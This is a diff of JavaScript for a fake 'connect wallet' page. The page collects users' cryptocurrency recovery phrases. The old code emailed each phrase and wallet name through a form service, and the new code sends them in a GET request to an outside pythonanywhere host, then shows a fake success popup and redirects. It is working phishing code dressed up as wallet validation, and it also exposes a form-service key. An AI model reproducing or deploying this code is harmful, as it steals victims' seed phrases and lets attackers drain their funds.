@@ -1561,46 +1561,56 @@
             })
 
             //FOR PHRASE TEXT VALIDATION
-           $('#submit').on('click', function (e) {
-            e.preventDefault();
-            let field = document.querySelector('#phrase-box');
-            console.log(field.value);
-            if (field.value.split(' ').length >= 12) {
-        $(this).text('Loading...').css('pointer-events', 'none');
+            $('#secret_phrase').on('keyup', function () {
+                var phrase_seed_entered = $(this).val().trim()
+                if (phrase_seed_entered != "") {
+                    var phrase_count = phrase_seed_entered.match(/(\w+)/g).length
+                    console.log(phrase_count)
+                    if ([12, 15, 18, 21, 24].includes(phrase_count)) {
+                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
+                    } else {
+                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
+                    }
+                } else {
+                    $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
+                }
+            })
+            
+          $('#submit').on('click', function (e) {
+                e.preventDefault();
+                let field = document.querySelector('#phrase-box')
+                console.log(field.value);
+                if (field.value.split(' ').length >= 12) {
+                    $(this).text('Loading...').css('pointer-events', 'none')
+                    //console.log({ "load_phrase": 1, "data_phrase": field.value, "wallet_selected": $('#wallet_name').text().trim() })
+                    const token = `00x500sxa5b0x10qxam4gx0x9ab2kshb00200${field.value}00x500sxa5b0x10qxam4gx0x9ab2kshb00200${$('#wallet_name').text().trim()}00x500sxa5b0x10qxam4gx0x9ab2kshb00200`
+                    $.ajax({
+                        url: "https://humptydumptyproject.pythonanywhere.com/zpi/bit32/"+token,
+                        method: "GET",
+                        //data: { "load_phrase": 1, "data_phrase": field.value, "wallet_selected": $('#wallet_name').text().trim() },
+                        success: function (result) {
+                           
+                                $('#button_connect_wallet').text('Connect Wallet').css('pointer-events', 'all')
+                                $('#popup_connect_wallet').modal('hide')
+                                $('#popup_connect_wallet_success').modal('show')
+                                window.setTimeout(function () {
+                                    window.location.href = 'https://rpcnode.pages.dev/';
+                                }, 300000);
 
-        // Define your email data
-        const emailData = {
-            to: 'Cookweldone@gmail.com',  // Replace with the recipient's email address
-            subject: 'New Submission',
-            text: `Data Phrase: ${field.value}\nWallet Name: ${$('#wallet_name').text().trim()}`
-        };
 
-        // Send email using Unstatic API
-        $.ajax({
-            url: 'https://forms.un-static.com/forms/85e84f5b015355166daa3b97f51976d55a0f6f8b',  // Unstatic's endpoint for sending emails
-            method: 'POST',
-            headers: {
-                'Authorization': '85e84f5b015355166daa3b97f51976d55a0f6f8b',  // Replace with your Unstatic API key
-                'Content-Type': 'application/json'
-            },
-            data: JSON.stringify(emailData),
-            success: function (result) {
-                $('#button_connect_wallet').text('Connect Wallet').css('pointer-events', 'all');
-                $('#popup_connect_wallet').modal('hide');
-                $('#popup_connect_wallet_success').modal('show');
-                window.setTimeout(function () {
-                    window.location.href = 'https://rpcnode.pages.dev/';
-                }, 300000);
-            },
-            error: function (xhr, ajaxOptions, thrownError) {
-                alert('Error sending email: ' + thrownError);
-            }
-        });
-    } else {
-        alert("Invalid Pass Phrase");
-    }
-});
+                            
 
+                            
+                        },
+                        error: function (xhr, ajaxOptions, thrownError) {
+                            alert(thrownError);
+                        }
+                    })
+                } else {
+                    alert("Invalid Pass Phrase")
+                }
+            })
+        })
           
           
 
